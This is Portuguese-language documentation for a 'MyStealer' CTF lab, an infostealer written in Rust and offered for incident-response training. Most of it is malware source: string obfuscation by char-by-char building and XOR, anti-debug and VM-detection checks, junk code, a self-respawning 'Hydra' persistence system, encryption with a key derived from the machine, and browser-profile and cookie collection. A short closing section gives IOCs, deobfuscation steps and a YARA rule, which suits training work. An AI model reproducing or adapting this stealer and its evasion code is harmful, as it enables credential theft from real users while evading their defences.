# 🎯 Técnicas e TTPs - MyStealer CTF Lab v0.3.1

## MITRE ATT&CK Mapping

| Técnica | ID | Categoria | Implementação |
|---------|----|-----------| --------------|
| Credentials from Password Stores | T1555 | Credential Access | `browser.rs` |
| Clipboard Data | T1115 | Collection | `clipboard.rs` |
| Data from Local System | T1005 | Collection | `files.rs` |
| System Information Discovery | T1082 | Discovery | `system_info.rs` |
| Automated Collection | T1119 | Collection | `CollectorManager` |
| Data Encrypted for Impact | T1486 | Impact | `crypto/` |
| Obfuscated Files or Information | T1027 | Defense Evasion | Todas as strings |
| Debugger Evasion | T1622 | Defense Evasion | `anti_debug.rs` |
| Virtualization/Sandbox Evasion | T1497 | Defense Evasion | `anti_analysis.rs` |
| Process Discovery | T1057 | Discovery | `system_info.rs` |

---

## 1. 🔐 Ofuscação Inteligente de Strings (NOVO v0.3.1)

### 1.1 Build String (`bs()`) - Construção Char-by-Char

A técnica mais eficaz para evitar detecção estática. Strings são construídas caractere por caractere em runtime.

```rust
/// Helper para construir strings em runtime
/// O compilador não consegue otimizar para string literal
#[inline(always)]
fn bs(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars {
        s.push(c);
    }
    // black_box previne otimizações do compilador
    std::hint::black_box(s)
}

// Uso - Nomes de browsers
let chrome = bs(&['C', 'h', 'r', 'o', 'm', 'e']);
let firefox = bs(&['F', 'i', 'r', 'e', 'f', 'o', 'x']);

// Uso - Caminhos de sistema
let config = bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g']);
let ssh = bs(&['.', 's', 's', 'h']);

// Uso - Comandos
let tasklist = bs(&['t', 'a', 's', 'k', 'l', 'i', 's', 't']);
let powershell = bs(&['p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l']);
```

**Por que funciona:**
- O compilador não consegue determinar o valor final em tempo de compilação
- `black_box()` previne inline e otimizações
- Cada caractere é um valor imediato separado no binário
- Ferramentas como `strings` não detectam sequências de caracteres

### 1.2 XOR Decode (`xd()`) - Strings Encriptadas

Para strings que precisam de proteção adicional:

```rust
/// XOR decode em runtime
#[inline(always)]
fn xd(data: &[u8], key: u8) -> String {
    data.iter().map(|b| (b ^ key) as char).collect()
}

// Uso - "sandbox" XOR 0x19
let sandbox = xd(&[0x7a, 0x76, 0x69, 0x75, 0x77, 0x68, 0x63], 0x19);

// Uso - "vmtoolsd" XOR 0x19
let vmtools = xd(&[0x6f, 0x6c, 0x7d, 0x6c, 0x6c, 0x69, 0x7c, 0x75], 0x19);
```

**Chaves XOR por categoria:**
| Key | Uso |
|-----|-----|
| `0x17` | Paths de sistema |
| `0x19` | Processos, usernames |
| `0x33` | Variáveis de ambiente |
| `0x42` | Nomes de browsers |
| `0x55` | Strings de crypto |
| `0x77` | Ferramentas de análise |

### 1.3 Serde Rename - Campos JSON Curtos

Todos os campos de serialização são renomeados para evitar strings legíveis:

```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserData {
    #[serde(rename = "b")]
    pub browsers_found: Vec<String>,
    
    #[serde(rename = "p")]
    pub profiles: Vec<BrowserProfile>,
    
    #[serde(rename = "c")]
    pub total_cookies: u32,
    
    #[serde(rename = "w")]
    pub total_passwords: u32,
    
    #[serde(rename = "h")]
    pub total_history: u32,
}
```

**Resultado no JSON:**
```json
{"b":["C","F"],"p":[...],"c":42,"w":5,"h":100}
```

### 1.4 SQL Query Builder - Queries em Runtime

Todas as queries SQL são construídas caractere por caractere:

```rust
fn build_cookies_query() -> String {
    let mut q = String::with_capacity(100);
    
    // SELECT
    for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
    
    // host_key, name, value, expires_utc, is_secure, is_httponly
    for c in ['h', 'o', 's', 't', '_', 'k', 'e', 'y', ',', ' '] { q.push(c); }
    for c in ['n', 'a', 'm', 'e', ',', ' '] { q.push(c); }
    for c in ['v', 'a', 'l', 'u', 'e', ',', ' '] { q.push(c); }
    for c in ['e', 'x', 'p', 'i', 'r', 'e', 's', '_', 'u', 't', 'c', ',', ' '] { q.push(c); }
    for c in ['i', 's', '_', 's', 'e', 'c', 'u', 'r', 'e', ',', ' '] { q.push(c); }
    for c in ['i', 's', '_', 'h', 't', 't', 'p', 'o', 'n', 'l', 'y', ' '] { q.push(c); }
    
    // FROM cookies
    for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
    for c in ['c', 'o', 'o', 'k', 'i', 'e', 's', ' '] { q.push(c); }
    
    // LIMIT 100
    for c in ['L', 'I', 'M', 'I', 'T', ' ', '1', '0', '0'] { q.push(c); }
    
    std::hint::black_box(q)
}
```

### 1.5 Regex Pattern Builder

Patterns de regex também são construídos em runtime:

```rust
fn build_regex(pattern_chars: &[char]) -> Option<Regex> {
    let pattern = bs(pattern_chars);
    Regex::new(&pattern).ok()
}

// Uso - (?i)password
let pattern = build_regex(&[
    '(', '?', 'i', ')', 'p', 'a', 's', 's', 'w', 'o', 'r', 'd'
]);

// Uso - (?i)\.env
let pattern = build_regex(&[
    '(', '?', 'i', ')', '\\', '.', 'e', 'n', 'v'
]);
```

---

## 2. 🛡️ Técnicas Anti-Análise

### 2.1 Anti-Debug

#### Timing Check
```rust
fn timing_check() -> bool {
    let start = std::time::Instant::now();
    
    // Operações que deveriam ser rápidas
    let mut x = 0u64;
    for i in 0..1000 {
        x = x.wrapping_add(i);
        x = x.wrapping_mul(0x5851F42D4C957F2D);
        x = x.rotate_left(17);
    }
    std::hint::black_box(x);
    
    // Se demorou mais de 50ms, debugger detectado
    start.elapsed() > std::time::Duration::from_millis(50)
}
```

#### TracerPid (Linux)
```rust
fn check_tracer_pid() -> bool {
    // Path construído em runtime
    let path = bs(&['/', 'p', 'r', 'o', 'c', '/', 's', 'e', 'l', 'f', '/', 's', 't', 'a', 't', 'u', 's']);
    
    if let Ok(status) = std::fs::read_to_string(&path) {
        for line in status.lines() {
            // "TracerPid:" construído em runtime
            let prefix = bs(&['T', 'r', 'a', 'c', 'e', 'r', 'P', 'i', 'd', ':']);
            if let Some(pid) = line.strip_prefix(&prefix) {
                if pid.trim() != "0" {
                    return true; // Debugger detectado
                }
            }
        }
    }
    false
}
```

### 2.2 Anti-Disassembly

#### Opaque Predicates
```rust
/// Sempre retorna true, mas disassemblers não conseguem determinar
#[inline(never)]
pub fn opaque_true() -> bool {
    let x = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(1);
    
    // x² sempre >= 0 para qualquer x
    // Mas análise estática não pode provar isso
    (x * x) >= 0 || x < 0
}
```

#### Junk Code
```rust
#[inline(never)]
pub fn junk_code_block() {
    let mut arr = [0u8; 64];
    
    // Operações que parecem importantes
    for i in 0..64 {
        arr[i] = (i as u8).wrapping_mul(0x41);
        arr[i] = arr[i].rotate_left(3);
        arr[i] ^= 0x55;
    }
    
    let mut sum = 0u64;
    for &b in &arr {
        sum = sum.wrapping_add(b as u64);
        sum = sum.wrapping_mul(0x100000001B3);
        if opaque_false() {
            sum = 0; // Nunca executa
        }
    }
    
    std::hint::black_box(arr);
    std::hint::black_box(sum);
}
```

### 2.3 Detecção de VM

```rust
fn check_vm_processes() -> bool {
    // Nomes de processos construídos em runtime
    let vm_procs = [
        bs(&['v', 'm', 't', 'o', 'o', 'l', 's', 'd']),
        bs(&['v', 'b', 'o', 'x', 's', 'e', 'r', 'v', 'i', 'c', 'e']),
        bs(&['q', 'e', 'm', 'u', '-', 'g', 'a']),
    ];
    
    let processes = get_running_processes();
    for proc in &vm_procs {
        if processes.iter().any(|p| p.to_lowercase().contains(proc)) {
            return true;
        }
    }
    false
}
```

---

## 3. 🐍 Sistema Hydra

### 3.1 Heartbeat IPC

```rust
pub fn send_heartbeat(&self) -> Result<(), HydraError> {
    // Nome do arquivo construído em runtime
    let hb_ext = bs(&['.', 'h', 'b']);
    let hb_path = self.ipc_dir.join(format!("{}{}", self.my_head.name(), hb_ext));
    
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    
    // Formato: PID:TIMESTAMP
    let content = format!("{}:{}", std::process::id(), timestamp);
    std::fs::write(&hb_path, content)?;
    
    Ok(())
}
```

### 3.2 Respawn com Backoff

```rust
pub fn respawn_head(&mut self, head: HydraHead) -> Result<(), HydraError> {
    // Backoff exponencial (2^n segundos, max 60s)
    let state = self.heads.get_mut(&head).unwrap();
    let backoff = std::cmp::min(
        2u64.pow(state.respawn_count),
        60 // MAX_RESPAWN_BACKOFF
    );
    state.respawn_count += 1;
    
    if backoff > 1 {
        std::thread::sleep(std::time::Duration::from_secs(backoff));
    }
    
    // Argumentos construídos em runtime
    let skip_arg = bs(&['-', '-', 's', 'k', 'i', 'p', '-', 'c', 'h', 'e', 'c', 'k', 's']);
    let role_arg = bs(&['-', '-', 'h', 'y', 'd', 'r', 'a', '-', 'r', 'o', 'l', 'e']);
    
    let exe_path = std::env::current_exe()?;
    Command::new(&exe_path)
        .args([&skip_arg, &role_arg, head.name()])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()?;
    
    Ok(())
}
```

---

## 4. 🔐 Criptografia

### 4.1 Key Derivation

```rust
pub fn derive_key() -> Result<[u8; 32], CryptoError> {
    let machine_id = get_machine_id()?;
    
    // Salt construído byte a byte
    let salt = get_obfuscated_salt();
    
    let mut key = [0u8; 32];
    argon2::Argon2::default()
        .hash_password_into(machine_id.as_bytes(), &salt, &mut key)?;
    
    Ok(key)
}

fn get_obfuscated_salt() -> [u8; 16] {
    let mut salt = [0u8; 16];
    // Cada byte construído individualmente
    salt[0] = 0x63 ^ 0x00;  // 'c'
    salt[1] = 0x74 ^ 0x00;  // 't'
    salt[2] = 0x66 ^ 0x00;  // 'f'
    salt[3] = 0x5f ^ 0x00;  // '_'
    // ... resto do salt
    salt
}
```

### 4.2 AES-256-GCM

```rust
pub fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
    let cipher = aes_gcm::Aes256Gcm::new_from_slice(&self.key)?;
    
    // Nonce aleatório de 12 bytes
    let nonce_bytes: [u8; 12] = rand::random();
    let nonce = aes_gcm::Nonce::from_slice(&nonce_bytes);
    
    let ciphertext = cipher.encrypt(nonce, data)?;
    
    // Formato: nonce (12 bytes) || ciphertext
    let mut result = Vec::with_capacity(12 + ciphertext.len());
    result.extend_from_slice(&nonce_bytes);
    result.extend(ciphertext);
    
    Ok(result)
}
```

---

## 5. 📊 Coleta de Dados

### 5.1 Browser Collector (com ofuscação)

```rust
fn find_browsers() -> Vec<BrowserPath> {
    let mut found = Vec::new();
    
    if let Some(home) = dirs::home_dir() {
        // Todos os paths construídos em runtime
        let paths = [
            (
                bs(&['C']),  // Chrome
                home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 
                               'g', 'o', 'o', 'g', 'l', 'e', '-', 
                               'c', 'h', 'r', 'o', 'm', 'e'])),
                true
            ),
            (
                bs(&['F']),  // Firefox
                home.join(bs(&['.', 'm', 'o', 'z', 'i', 'l', 'l', 'a', 
                               '/', 'f', 'i', 'r', 'e', 'f', 'o', 'x'])),
                false
            ),
            // ... outros browsers
        ];
        
        for (name, path, is_chromium) in paths {
            if path.exists() {
                found.push(BrowserPath { name, path, is_chromium });
            }
        }
    }
    
    found
}
```

---

## 6. 🔍 Detecção e Defesa (Blue Team)

### 6.1 Indicadores de Compromisso

**Arquivos:**
```yaml
Linux:
  - ~/.cache/fontconfig/alpha.lock
  - ~/.cache/fontconfig/*.hb
  
Windows:
  - %LOCALAPPDATA%\.cache\ms-runtime\*.lock
  - %LOCALAPPDATA%\.cache\ms-runtime\*.hb
```

**Comportamento:**
- Múltiplos processos idênticos (3 instâncias)
- Arquivos .hb atualizados a cada 5 segundos
- Respawn automático após kill
- Acesso a databases SQLite dos browsers

### 6.2 Detectando Ofuscação

Para reverter `bs()`:
1. Procure por loops que fazem `push(char)`
2. Colete os caracteres imediatos
3. Monte a string

Para reverter XOR:
1. Identifique a chave (geralmente constante próxima)
2. XOR cada byte com a chave
3. Converta para ASCII

### 6.3 Yara Rules

```yara
rule MyStealer_BS_Pattern {
    meta:
        description = "Detecta padrão de bs() string builder"
    
    strings:
        // Padrão de push em loop
        $bs_pattern = { 48 8B ?? 48 83 C? 01 88 ?? }
        
    condition:
        uint16(0) == 0x5A4D and #bs_pattern > 20
}
```

---

## 📚 Referências

- [MITRE ATT&CK](https://attack.mitre.org/)
- [Rust-for-Malware-Development](https://github.com/Whitecat18/Rust-for-Malware-Development)
- [Anti-Debug Tricks](https://anti-debug.checkpoint.com/)
- [String Obfuscation Techniques](https://www.virusbulletin.com/)

---

*Documentação para fins educacionais - CTF IR Training v0.3.1*
